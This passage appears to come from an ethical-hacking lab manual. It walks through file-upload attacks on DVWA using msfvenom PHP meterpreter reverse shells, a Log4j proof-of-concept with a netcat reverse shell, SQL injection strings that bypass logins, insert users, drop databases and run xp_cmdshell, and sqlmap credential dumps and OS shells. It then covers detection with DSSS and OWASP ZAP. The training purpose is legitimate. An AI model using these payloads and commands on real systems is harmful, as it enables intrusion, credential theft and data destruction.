In the Terminal window appears; type msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw and press Enter.

Here, the IP address of the host machine is 10.10.1.13 (the Parrot Security machine).

The raw payload is generated in the terminal window. Select the payload, right-click on it, and click Copy from the context menu to copy the payload, as shown in the screenshot.

Screenshot

Now, in the terminal window, type cd /home/attacker/Desktop/ and press Enter to navigate to the Desktop.

Type pluma upload.php and press Enter to launch the Pluma text editor.

Screenshot

The Pluma text editor window appears; press Ctrl+V to paste the raw payload copied in Step 7, and then press Ctrl+S to save the context.

Screenshot

Close all the open windows.

Click the Firefox icon from the top section of Desktop, type http://10.10.1.22:8080/dvwa/login.php. Into the address bar and press Enter.

The DVWA login page appears; enter the Username and Password as admin and password. Click the Login button.

If a Would you like Firefox to save this login notification appears at the top of the browser window, click Don’t Save.

Screenshot

The Welcome to Damn Vulnerable Web Application! Page appears. Click DVWA Security in the left pane to view the DVWA security level.

Change the security level from impossible to low by selecting Low from the drop-down list and clicking the Submit button, as shown in the screenshot.

Screenshot

Click the File Upload option from the left pane.

The Vulnerability: File Upload page appears; click the Browse… button to upload a file.

Screenshot

When the File Upload window appears, navigate to the Desktop location, select the payload file upload.php, and click Open.

Screenshot

Observe that the selected file (upload.php) appears to the right of Browse… button.

Now, click the Upload button to upload the file to the database.

Screenshot

You will see a message saying that the file has been uploaded successfully, with the location of the file. Note the location of the file and minimize the browser window.

Screenshot

Launch a Terminal window by clicking on the MATE Terminal icon at the top of Desktop.

In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type msfconsole and press Enter to launch the Metasploit framework.

In msfconsole, type use exploit/multi/handler and press Enter to set up the listener.

Screenshot

Now, set the payload, LHOST, and LPORT. To do so, use the below commands:

Type set payload php/meterpreter/reverse_tcp and press Enter
Type set LHOST 10.10.1.13 and press Enter
Type set LPORT 4444 and press Enter
Type run and press Enter to start the listener
Observe that the listener is up and running at 10.10.1.13. Minimize the terminal window.

Screenshot

Switch back to the Mozilla Firefox window where the DVWA website is open. Open a new tab, type http://10.10.1.22:8080/dvwa/hackable/uploads/upload.php in the address bar, and press Enter to execute the uploaded payload.

Screenshot

Switch back to the Terminal window and observe that a Meterpreter session has successfully been established with the victim system, as shown in the screenshot.

Screenshot

In the meterpreter command line, type sysinfo and press Enter to view the system details of the victim machine.

Screenshot

Close all open windows.

Launch a new Terminal window by clicking on the MATE Terminal icon at the top of Desktop window.

In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=3333 -f raw and press Enter.

Here, the IP address of the host machine is 10.10.1.13 (Parrot Security machine).

The raw payload is generated in the terminal window. Select the payload, right-click on it, and click Copy from the context menu to copy the payload, as shown in the screenshot.

Screenshot

Now, in the terminal window, type cd /home/attacker/Desktop/ and press Enter to navigate to the Desktop.

Type pluma medium.php.jpg and press Enter to launch the Pluma text editor.

Screenshot

The Pluma text editor window appears; press Ctrl+V to paste the raw payload copied in Step 39, and then press Ctrl+S to save the context.

Screenshot

Click the Firefox icon from the top section of Desktop, type http://10.10.1.22:8080/dvwa/login.php. Into the address bar, and press Enter. The DVWA login page appears; log in with the credentials admin and password, and click the Login button.

If a Would you like Firefox to save this login notification appears at the top of the browser window, click Don’t Save.

The Welcome to Damn Vulnerable Web Application! Page appears. Click DVWA Security from the left pane to view the DVWA security level.

Change the Security Level from impossible to medium by selecting Medium from the drop-down list and clicking the Submit button, as shown in the screenshot.

Screenshot

Click the File Upload option in the left pane.

The Vulnerability: File Upload page appears; click the Browse… button to upload a file.

Screenshot

The File Upload window appears. Navigate to the Desktop location and select the payload file medium.php.jpg and click Open.

Screenshot

Observe that the selected file (medium.php.jpg) appears to the right of the Browse… button.

Now, before uploading the file, set up a Burp Suite proxy. Start by configuring the proxy settings of the browser.

Click the Open Menu icon in the right corner of the menu bar and select Preferences from the list.

Screenshot

The General settings tab appears. In the Find in Preferences search bar, type proxy, and press Enter.

The Search Results appear; click the Settings button under the Network Settings option.

Screenshot

A Connection Settings window appears; select the Manual proxy configuration radio button and ensure that the HTTP Proxy is set to 127.0.0.1 and Port as 8080. Ensure that the Also use this proxy for FTP and HTTPS checkbox is selected and click OK. Close the Preferences tab.

Screenshot

Now, minimize the browser window, click Applications from the top left corner of Desktop and navigate to Pentesting --> Web Application Analysis --> Web Application Proxies --> burpsuite to launch the Burp Suite application.

Screenshot

If a security pop-up appears, enter the password as toor in the Password field and click OK.

In the next Burp Suite Community Edition notification, click OK.

Screenshot

If Terms and Conditions window appears click I Accept.

A notification appears saying that An update is available, click Close.

The Burp Suite main window appears. Ensure that the Temporary project radio button is selected and click the Next button, as shown in the screenshot.

Screenshot

In the next window, select the Use Burp defaults radio-button and click the Start Burp button.

Screenshot

The Burp Suite main window appears; click the Proxy tab from the available options in the top section of the window.

Screenshot

In the Proxy settings, by default, the Intercept tab opens-up. Observe that the interception is active by default, as the button says Intercept is on. Leave it running.

Turn the interception on if it is set to off.

Screenshot

Switch back to the browser window and click the Upload button under the Vulnerability: File Upload section to upload the payload file.

Screenshot

Switch back to the Burp Suite window. Observe that the request has been captured and displayed in the raw format under the Raw tab. In the filename field, you will see the name of the file to be uploaded as medium.php.jpg.

Screenshot

Change the filename to medium.php and click the Forward button to forward the request.

Screenshot

Now, turn the interception off by clicking on the Intercept is on button. The button now says Intercept is off, as shown in the screenshot. Close the window.

If a Confirm pop-up appears, click Yes.

Screenshot

Switch back to the browser window. Observe a message saying that the file has been uploaded successfully, along with the upload location of the file. Note down this location.

Screenshot

Remove the browser proxy set up in Step 54 by selecting the No proxy radio-button in the Connection Settings window and clicking OK. Close the tab.

Screenshot

Launch a Terminal window by clicking on the MATE Terminal icon at the top of Desktop.

In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type msfconsole and press Enter to launch the Metasploit framework.

In msfconsole, type use exploit/multi/handler and press Enter to begin setting up the listener.

You have to set up a listener so that you can establish a Meterpreter session with your victim. Follow the steps given below to set up a listener using the msf command line:

Type set payload php/meterpreter/reverse_tcp and press Enter
Type set LHOST 10.10.1.13 and press Enter
Type set LPORT 3333 and press Enter.
Type run and press Enter to start the listener
Screenshot

Switch to the Mozilla Firefox window where the DVWA website is open. Open a new tab, type http://10.10.1.22:8080/dvwa/hackable/uploads/medium.php into the address bar and press Enter to execute the uploaded payload.

Screenshot

Switch back to the Terminal window and observe that a Meterpreter session has successfully been established with the victim system.

Screenshot

In the meterpreter command line, type sysinfo and press Enter to view the system details of the victim machine.

Screenshot

Close all open windows.

Launch a Terminal window by clicking on the MATE Terminal icon at the top of Desktop.

In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=2222 -f raw and press Enter.

Here, the IP address of the host machine is 10.10.1.13 (Parrot Security machine).

The raw payload is generated in the terminal window. Select the payload, right-click on it, and click Copy from the context menu to copy the payload, as shown in the screenshot.

Screenshot

Now, in the terminal window, type cd /home/attacker/Desktop/ and press Enter to navigate to the Desktop.

Type pluma high.jpeg and press Enter to launch the Pluma text editor.

Screenshot

The Pluma text editor window appears; press Ctrl+V to paste the raw payload copied in Step 85. Edit the payload file by adding GIF98 to the first line and then press Ctrl+S to save the context.

Screenshot

Close all open windows.

Click the Firefox icon from the top section of Desktop, type http://10.10.1.22:8080/dvwa/login.php into the address bar and press Enter. The DVWA login page appears. Log in with the credentials admin and password, and click the Login button.

If a Would you like Firefox to save this login notification appears at the top of the browser window, click Don’t Save.

The Welcome to Damn Vulnerable Web Application! Page appears; click DVWA Security in the left pane to view the DVWA security level.

Change the Security Level from impossible to high by selecting High from the drop-down list and clicking the Submit button, as shown in the screenshot.

Screenshot

Click the File Upload option in the left pane. The Vulnerability: File Upload page appears. Click the Browse… button to upload a file.

Screenshot

The File Upload window appears. Navigate to the Desktop location, select the payload file high.jpeg, and click Open.

Screenshot

Observe that the selected file (high.jpeg) appears to the right of the Browse… button.

Now, click the Upload button to upload the file to the database.

Screenshot

You will see a message saying that the file has been uploaded successfully, along with the location of the uploaded file. Note down this location.

Screenshot

Now, click the Command Injection option in the left pane. The Vulnerability: Command Injection window appears; in the Enter an IP address field, type |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php and click the Submit button.

Screenshot

Observe a message saying that the file has been copied, as shown in the screenshot.

Screenshot

Launch a Terminal window by clicking on the MATE Terminal icon at the top of Desktop.

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type msfconsole and press Enter to launch the Metasploit framework.

In msfconsole, type use exploit/multi/handler and press Enter to begin setting up the listener.

You have to set up a listener so that you can establish a Meterpreter session with your victim. Follow the steps given below to set up a listener using the msf command line:

Type set payload php/meterpreter/reverse_tcp and press Enter
Type set LHOST 10.10.1.13 and press Enter
Type set LPORT 2222 and press Enter.
Type run and press Enter to start the listener
Screenshot

Switch to the Mozilla Firefox window where the DVWA website is open. Open a new tab, type http://10.10.1.22:8080/dvwa/hackable/uploads/shell.php into the address bar and press Enter to execute the uploaded payload.

Screenshot

Switch back to the Terminal window and observe that a Meterpreter session has successfully been established with the victim system.

Screenshot

In the meterpreter command line, type sysinfo and press Enter to view the system details of the victim machine.

Screenshot

This concludes the demonstration of how to exploit a file upload vulnerability at different security levels.

Close all open windows and document all acquired information.

========
Task 9: Gain Access by Exploiting Log4j Vulnerability
========

Log4j is an open-source framework that helps developers store various types of logs produced by users. Log4j which is also known as Log4shell and LogJam is a zero-day RCE (Remote Code Execution) vulnerability, tracked under CVE-2021–44228. Log4j enables insecure JNDI lookups, when these JNDI lookups are paired with the LDAP protocol, can be exploited to exfiltrate data or execute arbitrary code.

Here, we will gain backdoor access by exploiting Log4j vulnerability.

Here, we will install a vulnerable application in the Ubuntu machine and use the Parrot Security machine as the host machine to target the application.

Click Ubuntu to switch to the Ubuntu machine.

log1.jpg

Click to select Ubuntu account, in the Password field, type toor and press Enter to sign in.

log2.jpg

In the left pane, under Activities list, scroll down and click the Terminal icon to open the Terminal window.

log3.jpg

Now, type sudo su and hit Enter to gain super-user access. Ubuntu will ask for the password; type toor as the password and hit Enter.

log4.jpg

First we need to install docker.io in ubuntu machine, to do that type sudo apt-get update and press Enter.

log5.jpg

Once the update is completed, type sudo apt-get install docker.io and press Enter to install docker.

If a question appears Do you want to continue? type Y and press Enter.

log6.jpg

Once docker.io is successfully installed, type cd log4j-shell-poc/ and press Enter to navigate to log4j-shell-poc directory.

log7.jpg

Now, we need to setup log4j vulnerable server, to do that type docker build -t log4j-shell-poc . and press Enter.

-t: specifies allocating a pseudo-tty.

log8.jpg

Type docker run --network host log4j-shell-poc and press Enter, to start the vulnerable server.

log9.jpg

Leave the server running in the Ubuntu machine.

Click Parrot Security to switch to the Parrot Security machine.

Click the Firefox icon at the top of Desktop, to open a browser window.

log10.jpg

In the address bar of the browser, type http://10.10.1.9:8080 and press Enter.

log11.jpg

As we can observe that the Log4j vulnerable server is successfully running on the Ubuntu machine, leave the Firefox and website open.

Click the MATE Terminal icon at the top of Desktop, to open a Terminal window.

log12.jpg

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

log13.jpg

Type cd log4j-shell-poc and press Enter, to enter into log4j-shell-poc directory.

log14.jpg

Now, we needed to install JDK 8, to do that open a new terminal window and type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

log15.jpg

We need to extract JDK zip file which is already placed at /home/attacker location.

Type tar -xf jdk-8u202-linux-x64.tar.gz and press Enter, to extract the file.

-xf: specifies extract all files.

log16.jpg

Now we will move the jdk1.8.0_202 into /usr/bin/. To do that, type mv jdk1.8.0_202 /usr/bin/ and press Enter.

log17.jpg

Now, we need to update the installed JDK path in the poc.py file.

Navigate to the previous terminal window. In the terminal, type pluma poc.py and press Enter to open poc.py file.

log18.jpg

In the poc.py file scroll down and in line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.

log19.jpg

Scroll down to line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.

log20.jpg

Scroll down to line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.

log21.jpg

After making all the changes save the changes and close the poc.py editor window.

Now, open a new terminal window and type nc -lvp 9001 and press Enter, to initiate a netcat listener as shown in screenshot.

log22.jpg

Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001 and press Enter, to start the exploitation and create payload.

log23.jpg

Now, copy the payload generated in the send me: section.

log24.jpg

Switch to Firefox browser window, in Username field paste the payload that was copied in previous step and in Password field type password and press Login button as shown in the screenshot.

In the Password field you can enter any password.

log25.jpg

Now switch to the netcat listener, you can see that a reverse shell is opened.

log26.jpg

In the listener window type pwd and press Enter, to view the present working directory.

log27.jpg

Now, type whoami and press Enter.

log28.jpg

We can see that we have shell access to the target web application as a root user.

The Log4j vulnerability takes the payload as input and processes it, as a result we will obtain a reverse shell.

This concludes the demonstration of how to gain backdoor access exploiting Log4j vulnerability.

Close all open windows and document all acquired information.

########
Module 15 - SQL Injection
########

########
Lab 1 - Perform SQL Injection Attacks
########

========
Task 1: Perform an SQL Injection Attack on an MSSQL Database
========

In this task, the machine hosting the website (Windows Server 2019) is the victim machine; and the Windows 11 machine will perform the attack.

By default, Windows 11 machine is selected, click Ctrl+Alt+Delete.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open any web browser (here, Mozilla Firefox), place the cursor in the address bar, type http://www.goodshopping.com/, and press Enter.

The GOOD SHOPPING home page loads. Assume that you are new to this site and have never registered with it; click LOGIN on the menu bar.

Screenshot

In the Username field, type the query blah' or 1=1 -- as your login name, and leave the password field empty. Click the Log in button.

2022-04-20_14-26-39.png

You are now logged into the website with a fake login, even though your credentials are not valid. Now, you can browse all the site’s pages as a registered member. After browsing the site, click Logout from the top-right corner of the webpage.

2022-04-20_14-27-55.png

Blind SQL injection is used when a web application is vulnerable to an SQL injection, but the results of the injection are not visible to the attacker. It is identical to a normal SQL injection except that when an attacker attempts to exploit an application, rather than seeing a useful (i.e., information-rich) error message, a generic custom page is displayed. In blind SQL injection, an attacker poses a true or false question to the database to see if the application is vulnerable to SQL injection.

Now, we shall create a user account using the SQL injection query. Before proceeding with this sub-task, we shall first examine the login database of the GoodShopping website.

Click Windows Server 2019 to switch to the Windows Server 2019 machine.

Click Ctrl+Alt+Delete to activate the machine. By default, Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows Server 2019 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

In this task, we are logging into the Windows Server 2019 machine as a victim.

Screenshot

Click the Type here to search icon in the lower section of Desktop and type microsoft. From the results, click Microsoft SQL Server Management Studio 18.

Screenshot

Microsoft SQL Server Management Studio opens, along with a Connect to Server pop-up. In the Connect to Server pop-up, leave the default settings as they are and click the Connect button.

Screenshot

In the left pane of the Microsoft SQL Server Management Studio window, under the Object Explorer section, expand the Databases node. From the available options, expand the GoodShopping node, and then the Tables node under it.

Under the Tables node, right-click the dbo.Login file and click Select Top 1000 Rows from the context menu to view the available credentials.

2022-04-20_14-31-10.png

You can observe that the database contains only one entry with the username and password as smith and smith123, respectively.

2022-04-20_14-32-37.png

Click Windows 11 to switch back to the Windows 11 machine and go to the browser where the GoodShopping website is open.

Click LOGIN on the menu bar and type the query blah';insert into login values ('john','apple123'); -- in the Username field (as your login name) and leave the password field empty. Click the Log in button.

2022-04-20_14-35-21.png

If no error message is displayed, it means that you have successfully created your login using an SQL injection query.

After executing the query, to verify whether your login has been created successfully, click the LOGIN tab, enter john in the Username field and apple123 in the Password field, and click Log in.

Screenshot

You will log in successfully with the created login and be able to access all the features of the website.

In the Save login for goodshopping.com? pop-up, click Don't Save.

After browsing the required pages, click Logout from the top-right corner of the webpage.

Screenshot

Click Windows Server 2019 to switch back to the victim machine (Windows Server 2019 machine).

In the Microsoft SQL Server Management Studio window, right-click dbo.Login, and click Select Top 1000 Rows from the context menu.

You will observe that a new user entry has been added to the website’s login database file with the username and password as john and apple123, respectively. Note down the available databases.

2022-04-20_14-38-27.png

Click Windows 11 to switch back to the Windows 11 machine and the browser where the GoodShopping website is open.

Click LOGIN on the menu bar and type the query blah';create database mydatabase; -- in the Username field (as your login name) and leave the password field empty. Click the Log in button.

In the above query, mydatabase is the name of the database.

2022-04-20_14-39-46.png

If no error message (or any message) displays on the webpage, it means that the site is vulnerable to SQL injection and a database with the name mydatabase has been created on the database server.

Click Windows Server 2019 to switch back to the Windows Server 2019 machine.

In the Microsoft SQL Server Management Studio window, un-expand the Databases node and click the Disconnect icon ( 2022-04-20_14-43-14.png) and then click Connect Object Explorer icon ( 123dcdc.png) to connect to the database. In the Connect to Server pop-up, leave the default settings as they are and click the Connect button.

Expand the Databases node. A new database has been created with the name mydatabase, as shown in the screenshot.

2022-04-20_14-46-32.png

Click Windows 11 to switch back to the Windows 11 machine and the browser where the GoodShopping website is open.

Click LOGIN on the menu bar and type the query blah'; DROP DATABASE mydatabase; -- in the Username field; leave the Password field empty and click Log in.

In the above query, you are deleting the database that you created in Step 25 (mydatabase). In the same way, you could also delete a table from the victim website database by typing blah'; DROP TABLE table_name; -- in the Username field.

2022-04-20_14-48-12.png

To see whether the query has successfully executed, Click Windows Server 2019 to switch back to the victim machine (Windows Server 2019); and in the Microsoft SQL Server Management Studio window, click the Refresh icon.

Expand Databases node in the left pane; you will observe that the database called mydatabase has been deleted from the list of available databases, as shown in the screenshot.

2022-04-20_14-50-25.png

In this case, we are deleting the same database that we created previously. However, in real-life attacks, if an attacker can determine the available database name and tables in the victim website, they can delete the database or tables by executing SQL injection queries.

Close the Microsoft SQL Server Management Studio window.

Click Windows 11 to switch back to the Windows 11 machine and the browser where the GoodShopping website is open.

Click LOGIN on the menu bar and type the query blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- in the Username field; leave the Password field empty and click Log in.

In the above query, you are pinging the www.certifiedhacker.com website using an SQL injection query. -l is the sent buffer size and -t refers to pinging the specific host.

2022-04-20_14-52-30.png

The SQL injection query starts pinging the host, and the login page shows a Waiting for www.goodshopping.com… message at the bottom of the window.

To see whether the query has successfully executed, click Windows Server 2019 to switch back to the victim machine (Windows Server 2019).

Right-click the Start icon in the bottom-left corner of Desktop and from the options, click Task Manager. Click More details in the lower section of the Task Manager window.

Navigate to the Details tab and type p. You can observe a process called PING.EXE running in the background.

This process is the result of the SQL injection query that you entered in the login field of the target website.

2022-04-20_15-41-38.png

To manually kill this process, click PING.EXE, and click the End task button in the bottom right of the window.

If a Task Manager pop-up appears, click End process. This stops or prevents the website from pinging the host.

This concludes the demonstration of how to perform SQL injection attacks on an MSSQL database.

Close all open windows and document all the acquired information.

========
Task 2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap
========

You can use sqlmap to perform SQL injection on a target website using various techniques, including Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band SQL injection.

In this task, we will use sqlmap to perform SQL injection attack against MSSQL to extract databases.

In this task, you will pretend that you are a registered user on the http://www.moviescope.com website, and you want to crack the passwords of the other users from the website’s database.

Click Parrot Security to switch to the Parrot Security machine.

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

Click the Mozilla Firefox icon from the menu bar in the top-left corner of Desktop to launch the web browser.

Screenshot

Type http://www.moviescope.com/ and press Enter. A Login page loads; enter the Username and Password as sam and test, respectively. Click the Login button.

If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save.

Screenshot

Once you are logged into the website, click the View Profile tab on the menu bar and, when the page has loaded, make a note of the URL in the address bar of the browser.

Screenshot

Right-click anywhere on the webpage and click Inspect Element (Q) from the context menu, as shown in the screenshot.

Screenshot

The Developer Tools frame appears in the lower section of the browser window. Click the Console tab, type document.cookie in the lower-left corner of the browser, and press Enter.

Screenshot

Select the cookie value, then right-click and copy it, as shown in the screenshot. Minimize the web browser.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Parrot Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

In the Parrot Terminal window, type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs and press Enter.

In this query, -u specifies the target URL (the one you noted down in Step 6), --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases.

The above query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the MovieScope website.

Screenshot

If the message Do you want to skip test payloads specific for other DBMSes? [Y/n] appears, type Y and press Enter.

If the message for the remaining tests, do you want to include all tests for ‘Microsoft SQL Server’ extending provided level (1) and risk (1) values? [Y/n] appears, type Y and press Enter.

Similarly, if any other message appears, type Y and press Enter to continue.

Screenshot

sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS, as shown in the screenshot.

Screenshot

Now, you need to choose a database and use sqlmap to retrieve the tables in the database. In this lab, we are going to determine the tables associated with the database moviescope.

Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables and press Enter.

In this query, -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables.

The above query causes sqlmap to scan the moviescope database for tables located in the database.

Screenshot

sqlmap retrieves the table contents of the moviescope database and displays them, as shown in screenshot.

Screenshot

Now, you need to retrieve the table content of the column User_Login.

Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump and press Enter to dump all the User_Login table content.

Screenshot

sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users’ usernames under the Uname column and passwords under the password column, as shown in screenshot.

You will see that under the password column, the passwords are shown in plain text form.

Screenshot

To verify if the login details are valid, you should try to log in with the extracted login details of any of the users. To do so, switch back to the web browser, close the Developer Tools console, and click Logout to start a new session on the site.

Screenshot

The Login page appears; log in into the website using the retrieved credentials john/qwerty.

If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save.

Screenshot

You will observe that you have successfully logged into the MovieScope website with john’s account, as shown in the screenshot.

Screenshot

Now, switch back to the Parrot Terminal window. Type sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shell and press Enter.

In this query, --os-shell is the prompt for an interactive OS shell.

Screenshot

If the message do you want sqlmap to try to optimize value(s) for DBMS delay responses appears, type Y and press Enter to continue.

Screenshot

Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. Type hostname and press Enter to find the machine name where the site is running.

If the message do you want to retrieve the command standard output? appears, type Y and press Enter.

Screenshot

sqlmap will retrieve the hostname of the machine on which the target web application is running, as shown in the screenshot.

Screenshot

Type TASKLIST and press Enter to view a list of tasks that are currently running on the target system.

Screenshot

If the message do you want to retrieve the command standard output? appears, type Y and press Enter.

The above command retrieves the tasks and displays them under the command standard output section, as shown in the screenshots below.

Screenshot

Following the same process, you can use various other commands to obtain further detailed information about the target machine.

To view the available commands under the OS shell, type help and press Enter.

Screenshot

This concludes the demonstration of how to launch a SQL injection attack against MSSQL to extract databases using sqlmap.

Close all open windows and document all the acquired information.

You can also use other SQL injection tools such as Mole (https://sourceforge.net), Blisqy (https://github.com), blind-sql-bitshifting (https://github.com), and NoSQLMap (https://github.com) to perform SQL injection attacks.

########
Lab 2: Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools
########

========
Task 1: Detect SQL Injection Vulnerabilities using DSSS
========

Here, we will use DSSS to detect SQL injection vulnerabilities in a web application.

We will scan the www.moviescope.com website that is hosted on the Windows Server 2019 machine.

On the Parrot Security machine, click the MATE Terminal icon at the top of the Desktop window to open a Parrot Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

In the MATE Terminal type cd DSSS and press Enter to navigate to the DSSS folder which is already downloaded.

Screenshot

In the terminal window, type python3 dsss.py and press Enter to view a list of available options in the DSSS application, as shown in the screenshot.

Screenshot

Now, minimize the Terminal window and click on the Firefox icon in the top section of Desktop to launch Firefox.

In the Mozilla Firefox window, type http://www.moviescope.com/ in the address bar and press Enter. A Login page loads; enter the Username and Password as sam and test, respectively. Click the Login button.

If a Would you like Firefox to save this login for moviescope.com? notification appears at the top of the browser window, click Don’t Save.

Screenshot

Once you are logged into the website, click the View Profile tab from the menu bar; and when the page has loaded, make a note of the URL in the address bar of the browser.

Right-click anywhere on the webpage and click Inspect Element (Q) from the context menu, as shown in the screenshot.

Screenshot

The Developer Tools frame appears in the lower section of the browser window. Click the Console tab, type document.cookie in the lower-left corner of the browser, and press Enter.

Screenshot

Select the cookie value, then right-click and copy it, as shown in the screenshot. Minimize the web browser.

Screenshot

Switch to a terminal window and type python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 11]" and press Enter.

In this command, -u specifies the target URL and --cookie specifies the HTTP cookie header value.

Screenshot

The above command causes DSSS to scan the target website for SQL injection vulnerabilities.

The result appears, showing that the target website (www.moviescope.com) is vulnerable to blind SQL injection attacks. The vulnerable link is also displayed, as shown in the screenshot.

Screenshot

Highlight the vulnerable website link, right-click it, and, from the options, click Copy.

Screenshot

Switch to Mozilla Firefox; in a new tab, paste the copied link in the address bar and press Enter.

You will observe that information regarding available user accounts appears under the View Profile tab.

2022-04-20_16-27-19.png

Scroll down to view the user account information for all users.

Screenshot

Screenshot

In real life, attackers use blind SQL injection to access or destroy sensitive data. Attackers can steal data by asking a series of true or false questions through SQL statements. The results of the injection are not visible to the attacker. This type of attack can become time-intensive, because the database must generate a new statement for each newly recovered bit.

This concludes the demonstration of how to detect SQL injection vulnerabilities using DSSS.

Close all open windows and document all the acquired information

========
Task 2: Detect SQL Injection Vulnerabilities using OWASP ZAP
========

In this task, we will use OWASP ZAP to test a web application for SQL injection vulnerabilities.

We will scan the www.moviescope.com website that is hosted on the Windows Server 2019 machine.

Click Windows Server 2019 to switch to the Windows Server 2019 machine.

If you are logged out of the Windows Server 2019 machine, click Ctrl+Alt+Delete, then login into Administrator user profile using Pa$$w0rd as password.

Click Type here to search icon ( 2022-04-20_17-09-59.png) on the Desktop. Type zap in the search field, the Zap 2.11.1 appears in the results, press Enter launch it.

Screenshot

OWASP ZAP initialized and a prompt that reads Do you want to persist the ZAP Session? appears; select the No, I do not want to persist this session at this moment in time radio button, and click Start.

If a Manage Add-ons window appears, close it.

Screenshot

The OWASP ZAP main window appears; under the Quick Start tab, click the Automated Scan option.

If OWASP ZAP alert pop-up appears, click OK in all the pop-ups.

Screenshot

The Automated Scan wizard appears, enter the target website in the URL to attack field (in this case, http://www.moviescope.com). Leave other options set to default, and then click the Attack button.

Screenshot

OWASP ZAP starts performing Active Scan on the target website, as shown in the screenshot.

Screenshot

After the scan completes, Alerts tab appears, as shown in the screenshot.

You can observe the vulnerabilities found on the website under the Alerts tab.

The discovered vulnerabilities might differ when you perform this task.

Screenshot

Now, expand the SQL Injection vulnerability node under the Alerts tab.

If you do not see SQL Injection vulnerability under the Alerts tab, perform

2022-04-20_17-20-50.png

Click on the discovered SQL Injection vulnerability and further click on the vulnerable URL.

You can observe the information such as Risk, Confidence, Parameter, Attack, etc., regarding the discovered SQL Injection vulnerability in the lower right-bottom, as shown in the screenshot.

The risks associated with the vulnerability are categorized according to severity of risk as Low, Medium, High, and Informational alerts. Each level of risk is represented by a different flag color:

Red Flag: High risk
Orange Flag: Medium risk
Yellow Flag: Low risk
Blue Flag: Provides details about information disclosure vulnerabilities
2022-04-20_17-25-37.png

This concludes the demonstration of how to detect SQL injection vulnerabilities using OWASP ZAP.

Close all open windows and document all the acquired information.

You can also use other SQL injection detection tools such as Acunetix Web Vulnerability Scanner (https://www.acunetix.com), Snort (https://snort.org), Burp Suite (https://www.portswigger.net), w3af (https://w3af.org), to detect SQL injection vulnerabilities.


########
Module 16: Hacking Wireless Networks
########

########
